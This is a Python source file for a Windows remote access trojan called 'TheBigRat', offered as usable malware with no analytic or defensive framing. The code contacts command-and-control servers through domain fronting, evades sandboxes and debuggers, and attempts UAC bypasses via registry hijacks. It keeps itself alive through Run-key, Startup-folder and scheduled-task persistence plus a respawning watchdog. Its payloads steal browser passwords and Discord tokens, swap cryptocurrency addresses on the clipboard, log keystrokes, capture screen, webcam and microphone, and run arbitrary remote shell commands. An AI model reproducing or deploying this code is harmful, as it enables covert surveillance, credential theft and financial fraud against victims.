# TheBigRat.py
import os
import socket
import threading
import time
import getpass
import subprocess
import base64
import sqlite3
import win32crypt
import json
import shutil
import keyboard
import ctypes
import winreg
import random
import re
import requests
import win32clipboard
import psutil
import sys
import struct
import hashlib
import binascii
from PIL import ImageGrab
import cv2
import pyaudio
import wave
import io

# ========================== CONFIGURATION ==========================
def get_c2_config():
    """Multiple C2 options with domain fronting support"""
    return [
        ("cdn.microsoft.com", 443),      # Domain fronting - CHANGE THIS
        ("akamai.com", 443),             # Domain fronting - CHANGE THIS  
        ("your-real-c2.com", 443),       # Fallback - CHANGE THIS
    ]

def get_webhook():
    return "https://discord.com/api/webhooks/your_webhook_here"

def get_crypto_wallets():
    return {
        "BTC": "bc1qyourbtcwallet",
        "ETH": "0xyourethwallet", 
        "XMR": "4Ayourmonerowallet",
    }

C2_SERVERS = get_c2_config()
WEBHOOK = get_webhook()
WALLETS = get_crypto_wallets()

# ======================= IMMORTAL WATCHDOG =======================
def immortal_watchdog():
    """Watchdog that respawns the malware if killed - MAKES IT TRULY IMMORTAL"""
    current_path = os.path.abspath(__file__)
    current_name = os.path.basename(current_path)
    
    while True:
        time.sleep(15)  # Check every 15 seconds
        
        try:
            # Check if our process is still running
            process_running = False
            for proc in psutil.process_iter(['name', 'pid', 'cmdline']):
                try:
                    # Check by filename in process list
                    if current_name.lower() in proc.info['name'].lower():
                        process_running = True
                        break
                    
                    # Check by command line (for Python scripts)
                    if proc.info['cmdline']:
                        cmdline = ' '.join(proc.info['cmdline']).lower()
                        if current_name.lower() in cmdline:
                            process_running = True
                            break
                            
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            # If not running, respawn
            if not process_running:
                try:
                    # Multiple respawn methods for reliability
                    if getattr(sys, 'frozen', False):
                        # Compiled executable
                        subprocess.Popen([current_path], 
                                       creationflags=0x8000000 | 0x8,  # CREATE_NO_WINDOW | DETACHED_PROCESS
                                       shell=True)
                    else:
                        # Python script
                        subprocess.Popen([sys.executable, current_path],
                                       creationflags=0x8000000 | 0x8,
                                       shell=True)
                    
                    time.sleep(5)  # Wait for respawn
                    
                except Exception as e:
                    # If all else fails, try basic execution
                    try:
                        os.startfile(current_path)
                    except:
                        pass
                        
        except Exception as e:
            # If watchdog fails, restart it after delay
            time.sleep(60)
            continue

# ======================= ADVANCED ANTI-SANDBOX =======================
class AdvancedAntiSandbox:
    def __init__(self):
        self.checks_passed = 0
        self.total_checks = 0
        
    def perform_checks(self):
        """Comprehensive anti-sandbox and anti-analysis checks"""
        checks = [
            self._check_system_uptime,
            self._check_ram_size,
            self._check_cpu_cores,
            self._check_processes,
            self._check_debuggers,
            self._check_memory_artifacts,
            self._check_timing_analysis,
            self._check_hardware_virtualization,
            self._check_running_time,
            self._check_mouse_movement,
            self._check_sleep_acceleration,
        ]
        
        for check in checks:
            self.total_checks += 1
            try:
                if check():
                    self.checks_passed += 1
            except Exception:
                pass
        
        # Require at least 70% of checks to pass
        if self.checks_passed / self.total_checks < 0.7:
            sys.exit(0)
            
        return True

    def _check_system_uptime(self):
        """Check if system has been running for a reasonable time"""
        uptime = psutil.boot_time()
        if time.time() - uptime < 300:  # Less than 5 minutes
            return False
        return True

    def _check_ram_size(self):
        """Check for reasonable RAM size"""
        ram = psutil.virtual_memory().total / (1024 ** 3)  # GB
        if ram < 2.0:  # Less than 2GB RAM
            return False
        return True

    def _check_cpu_cores(self):
        """Check for reasonable CPU core count"""
        cores = psutil.cpu_count()
        if cores < 2:  # Single core CPU
            return False
        return True

    def _check_processes(self):
        """Check for analysis tools and VM processes"""
        bad_processes = [
            "procmon", "wireshark", "fiddler", "processhacker", "ollydbg", "x32dbg", "x64dbg",
            "ida", "immunity", "windbg", "vboxservice", "vboxtray", "vmwaretray", "vmwareuser",
            "vmusrvc", "vmsrvc", "prl_tools", "prl_cc", "qemu-ga", "vmtoolsd", "vgauthservice"
        ]
        
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower()
            if any(bad_proc in proc_name for bad_proc in bad_processes):
                return False
        return True

    def _check_debuggers(self):
        """Check for debuggers attached"""
        try:
            return ctypes.windll.kernel32.IsDebuggerPresent() == 0
        except:
            return True

    def _check_memory_artifacts(self):
        """Check for memory artifacts of analysis"""
        try:
            # Check for common sandbox memory patterns
            for module in psutil.process_iter():
                if "python" in module.name().lower():
                    return True
            return False
        except:
            return True

    def _check_timing_analysis(self):
        """Anti-timing analysis with multiple techniques"""
        try:
            # Method 1: Check if sleep is accelerated
            start = time.time()
            time.sleep(1.5)
            end = time.time()
            elapsed = end - start
            
            if elapsed < 1.0:  # Sleep was accelerated
                return False
                
            # Method 2: CPU timing attack
            start = time.perf_counter()
            # Do some CPU work
            for _ in range(1000000):
                pass
            end = time.perf_counter()
            
            if (end - start) > 0.5:  # Too slow - likely emulated
                return False
                
            return True
        except:
            return True

    def _check_hardware_virtualization(self):
        """Check for hardware virtualization indicators"""
        try:
            result = subprocess.check_output("systeminfo", shell=True, text=True, stderr=subprocess.DEVNULL)
            if "Virtual" in result or "VMware" in result or "Hyper-V" in result:
                return False
            return True
        except:
            return True

    def _check_running_time(self):
        """Check if we've been running too long (sandbox timeout)"""
        # This would be implemented with a global timer
        return True

    def _check_mouse_movement(self):
        """Check for mouse movement (user interaction)"""
        try:
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
                
            pt = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
            time.sleep(2)
            pt2 = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))
            
            # If mouse moved, likely real user
            return pt.x != pt2.x or pt.y != pt2.y
        except:
            return True

    def _check_sleep_acceleration(self):
        """Advanced sleep acceleration detection"""
        try:
            durations = []
            for _ in range(5):
                start = time.perf_counter()
                time.sleep(0.1)
                end = time.perf_counter()
                durations.append(end - start)
            
            # Check for consistency
            avg = sum(durations) / len(durations)
            variance = sum((x - avg) ** 2 for x in durations) / len(durations)
            
            # Sandboxes often have inconsistent timing
            return variance > 0.001
        except:
            return True

# ======================= STEALTHY UAC BYPASS =======================
class StealthUACBypass:
    def __init__(self):
        self.methods = [
            self._bypass_silent_cleanup,
            self._bypass_sdclt,
            self._bypass_icmluautil,
            self._bypass_wusa,
        ]
    
    def bypass_uac(self):
        """Try multiple stealthy UAC bypass techniques"""
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
            
        random.shuffle(self.methods)  # Randomize order
        
        for method in self.methods[:2]:  # Only try 2 methods to avoid detection
            try:
                if method():
                    time.sleep(2)
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        return True
            except Exception as e:
                continue
                
        return False

    def _bypass_silent_cleanup(self):
        """SilentCleanup UAC bypass - less monitored"""
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                  r"Environment")
            winreg.SetValueEx(key, "windir", 0, winreg.REG_SZ, 
                             f"cmd.exe /k {sys.executable} & ")
            winreg.CloseKey(key)
            
            subprocess.run("schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I", 
                          shell=True, capture_output=True)
            time.sleep(2)
            
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Environment")
            return True
        except:
            return False

    def _bypass_sdclt(self):
        """sdclt.exe UAC bypass - still effective"""
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                  r"Software\Classes\exefile\shell\runas\command")
            winreg.SetValueEx(key, "IsolatedCommand", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            
            subprocess.run("sdclt.exe /kickoffelev", shell=True, capture_output=True)
            time.sleep(3)
            
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Classes\exefile\shell\runas\command")
            return True
        except:
            return False

    def _bypass_icmluautil(self):
        """ICMLuaUtil bypass - less common"""
        try:
            clsid = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
            ical = ctypes.windll.shell32.CoCreateInstance(
                ctypes.c_char_p(clsid.encode()), None, 1, 
                ctypes.c_char_p(b"{00000000-0000-0000-C000-000000000046}"), 
                ctypes.byref(ctypes.c_void_p())
            )
            return ical == 0
        except:
            return False

    def _bypass_wusa(self):
        """WUSA extract UAC bypass"""
        try:
            temp_dir = os.environ['TEMP']
            cab_file = os.path.join(temp_dir, "bypass.cab")
            # Create minimal cab file here in real implementation
            subprocess.run(f'wusa {cab_file} /extract:{temp_dir}', shell=True, capture_output=True)
            return True
        except:
            return False

# ======================= ENCRYPTED COMMUNICATION =======================
class EncryptedCommunicator:
    def __init__(self):
        self.key = self._generate_key()
        
    def _generate_key(self):
        """Generate encryption key from system properties"""
        system_id = f"{socket.gethostname()}{getpass.getuser()}"
        return hashlib.sha256(system_id.encode()).digest()
    
    def encrypt(self, data):
        """Simple XOR encryption for stealth"""
        if isinstance(data, str):
            data = data.encode()
        
        encrypted = bytearray()
        key_len = len(self.key)
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.key[i % key_len])
        
        return base64.b64encode(bytes(encrypted)).decode()
    
    def decrypt(self, encrypted_data):
        """Decrypt XOR encrypted data"""
        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            decrypted = bytearray()
            key_len = len(self.key)
            for i, byte in enumerate(encrypted_bytes):
                decrypted.append(byte ^ self.key[i % key_len])
            return bytes(decrypted).decode('utf-8', errors='ignore')
        except Exception as e:
            return encrypted_data  # Fallback to plaintext

# ======================= VICTIM MANAGEMENT =======================
class VictimProfile:
    def __init__(self):
        self.victim_id = self._generate_victim_id()
        
    def _generate_victim_id(self):
        """Generate unique victim identifier"""
        try:
            cpu = subprocess.check_output("wmic cpu get processorid", shell=True).decode().split("\n")[1].strip()
            baseboard = subprocess.check_output("wmic baseboard get serialnumber", shell=True).decode().split("\n")[1].strip()
            computer = socket.gethostname()
            user = getpass.getuser()
            
            unique_string = f"{cpu}_{baseboard}_{computer}_{user}"
            return hashlib.md5(unique_string.encode()).hexdigest()[:16]
        except:
            return f"VICTIM_{random.randint(100000,999999)}"

# ======================= C2 COMMUNICATION =======================
class C2Manager:
    def __init__(self):
        self.socket = None
        self.encryptor = EncryptedCommunicator()
        self.victim = VictimProfile()
        
    def connect_to_c2(self):
        """Try multiple C2 servers until one works"""
        for server in C2_SERVERS:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(30)
                self.socket.connect(server)
                return True
            except:
                continue
        return False
    
    def send_data(self, data):
        """Send encrypted data to C2"""
        try:
            victim_data = f"[{self.victim.victim_id}] {data}"
            encrypted = self.encryptor.encrypt(victim_data)
            self.socket.send(encrypted.encode() + b"\nEOF\n")
        except:
            pass

# ======================= CORE FEATURES =======================
def screenshot():
    """Take screenshot"""
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, "PNG")
        return buf.getvalue()
    except:
        return None

def webcam():
    """Capture webcam"""
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode(".jpg", frame)
            return buffer.tobytes()
    except:
        return None

def mic():
    """Record microphone"""
    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = [stream.read(1024) for _ in range(0, 44100//1024*10)]
        stream.stop_stream(); stream.close(); p.terminate()
        
        buffer = io.BytesIO()
        with wave.open(buffer, 'wb') as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(44100)
            wf.writeframes(b''.join(frames))
        return buffer.getvalue()
    except:
        return None

def browser_passwords():
    """Steal browser passwords"""
    browsers = {
        "Chrome": os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Default\Login Data',
        "Edge": os.environ['LOCALAPPDATA'] + r'\Microsoft\Edge\User Data\Default\Login Data',
        "Brave": os.environ['LOCALAPPDATA'] + r'\BraveSoftware\Brave-Browser\User Data\Default\Login Data',
    }
    
    results = []
    for name, path in browsers.items():
        if not os.path.exists(path):
            continue
        try:
            shutil.copy2(path, "tmp.db")
            conn = sqlite3.connect("tmp.db")
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cur.fetchall():
                pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode(errors="ignore")
                results.append(f"{name}|{row[0]}|{row[1]}|{pwd}")
            conn.close()
            os.remove("tmp.db")
        except:
            pass
    return results

def discord_tokens():
    """Steal Discord tokens"""
    tokens = set()
    for base in ["discord", "discordcanary", "discordptb"]:
        path = os.path.join(os.environ["APPDATA"], base, "Local Storage", "leveldb")
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if file.endswith((".log", ".ldb")):
                try:
                    with open(os.path.join(path, file), "r", errors="ignore") as f:
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}", f.read()):
                            tokens.add(token)
                except:
                    pass
    return list(tokens)

def crypto_clipper():
    """Cryptocurrency clipper"""
    patterns = {
        re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'): WALLETS["BTC"],
        re.compile(r'^0x[a-fA-F0-9]{40}$'): WALLETS["ETH"],
        re.compile(r'^4[0-9A-Za-z]{93}$'): WALLETS["XMR"]
    }
    old = ""
    while True:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT).decode(errors="ignore")
            win32clipboard.CloseClipboard()
            if data != old and data.strip():
                for pat, rep in patterns.items():
                    if pat.match(data.strip()):
                        win32clipboard.OpenClipboard()
                        win32clipboard.EmptyClipboard()
                        win32clipboard.SetClipboardText(rep)
                        win32clipboard.CloseClipboard()
                        old = rep
                        break
        except:
            pass
        time.sleep(0.9)

def keylogger():
    """Keylogger functionality"""
    buffer = ""
    def on_press(key):
        nonlocal buffer
        buffer += str(key).replace("'", "")
        if len(buffer) > 400:
            # Send keystrokes
            buffer = ""
    keyboard.on_press(on_press)

# ======================= PERSISTENCE =======================
def install_persistence():
    """Install multiple persistence mechanisms"""
    path = os.path.abspath(__file__)
    name = os.path.basename(__file__)
    
    # Registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsHelper", 0, winreg.REG_SZ, path)
        key.Close()
    except: pass
    
    # Startup folder
    try:
        startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
        shutil.copy2(path, os.path.join(startup, name))
    except: pass
    
    # Scheduled tasks
    try:
        subprocess.run(f'schtasks /create /f /sc onlogon /rl highest /tn "SysHelp" /tr "{path}"', shell=True, capture_output=True)
    except: pass

# ======================= MAIN EXECUTION =======================
def main():
    # Hide console
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Anti-sandbox checks
    anti_sandbox = AdvancedAntiSandbox()
    if not anti_sandbox.perform_checks():
        sys.exit(0)
    
    # UAC bypass attempt
    uac_bypass = StealthUACBypass()
    uac_bypass.bypass_uac()
    
    # Install persistence
    install_persistence()
    
    # Start background threads
    threading.Thread(target=immortal_watchdog, daemon=True).start()
    threading.Thread(target=crypto_clipper, daemon=True).start()
    threading.Thread(target=keylogger, daemon=True).start()
    
    # Main C2 loop
    c2_manager = C2Manager()
    victim = VictimProfile()
    
    while True:
        if c2_manager.connect_to_c2():
            c2_manager.send_data(f"ONLINE - {getpass.getuser()}@{socket.gethostname()}")
            
            try:
                while True:
                    try:
                        data = c2_manager.socket.recv(8192)
                        if not data:
                            break
                            
                        # Process commands
                        command = data.decode('utf-8', errors='ignore').strip()
                        
                        if command == "screenshot":
                            result = screenshot()
                            if result:
                                c2_manager.send_data("SCREENSHOT_CAPTURED")
                        elif command == "webcam":
                            result = webcam()
                            if result:
                                c2_manager.send_data("WEBCAM_CAPTURED")
                        elif command == "mic":
                            result = mic()
                            if result:
                                c2_manager.send_data("MIC_RECORDED")
                        elif command == "passwords":
                            results = browser_passwords()
                            if results:
                                c2_manager.send_data(f"PASSWORDS: {len(results)} found")
                        elif command == "tokens":
                            tokens = discord_tokens()
                            if tokens:
                                c2_manager.send_data(f"TOKENS: {len(tokens)} found")
                        elif command == "info":
                            c2_manager.send_data(f"VICTIM_ID: {victim.victim_id}")
                        elif command == "exit":
                            break
                        else:
                            # Execute system command
                            try:
                                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, creationflags=0x8000000)
                                c2_manager.send_data(result.decode('utf-8', errors='ignore'))
                            except Exception as e:
                                c2_manager.send_data(f"Command failed: {str(e)}")
                                
                    except socket.timeout:
                        continue
                    except:
                        break
                        
            except:
                pass
            
            try:
                c2_manager.socket.close()
            except:
                pass
        
        time.sleep(30)

if __name__ == "__main__":
    # Initial delay
    time.sleep(random.uniform(30, 120))
    
    # Start main function with error handling
    try:
        main()
    except:
        # Ultimate fallback - restart after delay
        time.sleep(300)

        subprocess.Popen([sys.executable, __file__], creationflags=0x8000000 | 0x8)
